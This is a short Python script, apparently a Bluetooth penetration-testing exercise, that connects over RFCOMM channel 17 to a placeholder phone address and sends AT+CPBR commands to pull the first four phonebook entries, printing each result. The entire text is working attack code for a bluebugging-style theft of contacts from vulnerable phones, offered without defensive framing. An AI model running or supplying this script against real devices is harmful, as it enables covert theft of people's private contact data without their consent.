import bluetooth

tgt_phone = 'AA:BB:CC:DD:EE:FF'
port = 17

with bluetooth.BluetoothSocket(bluetooth.RFCOMM) as phone_sock:
    phone_sock.connect((tgt_phone, port))

    for contact in range(1, 5):
        at_cmd = f'AT+CPBR={str(contact)}\n'
        phone_sock.send(at_cmd)
        result = phone_sock.recv(1024)
        print(f'[+] {str(contact)}: {result}')
